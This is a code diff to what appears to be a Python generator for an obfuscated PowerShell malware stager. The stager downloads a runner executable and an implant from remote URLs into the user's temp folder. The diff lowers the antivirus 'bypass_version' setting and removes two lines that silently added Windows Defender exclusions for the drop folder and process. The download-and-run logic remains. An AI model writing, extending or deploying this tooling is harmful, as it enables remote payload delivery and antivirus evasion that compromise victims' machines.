@@ -188,7 +188,7 @@ def gen_exec_chain(dest_var, implant_arg, local=False):
     ])
 
 
-def generate(runner_url, implant_url, output_path="stager.ps1", bypass_version=3):
+def generate(runner_url, implant_url, output_path="stager.ps1", bypass_version=2):
     v_runner_url  = rv()
     v_implant_url = rv()
     v_temp        = rv()
@@ -232,9 +232,6 @@ def generate(runner_url, implant_url, output_path="stager.ps1", bypass_version=3
 if(-not {v_temp}){{{v_temp}=$env:USERPROFILE}}
 {v_dest}=[IO.Path]::Combine({v_temp},'{runner_suffix}.exe')
 {v_enc_dest}=[IO.Path]::Combine({v_temp},'{enc_suffix}.b64')
-
-Add-MpPreference -ExclusionPath {v_temp} -ErrorAction SilentlyContinue
-Add-MpPreference -ExclusionProcess '{runner_suffix}.exe' -ErrorAction SilentlyContinue
 
 {vdat}=(New-Object Net.WebClient).DownloadData({v_runner_url})
 {vdec}=New-Object byte[] {vdat}.Length
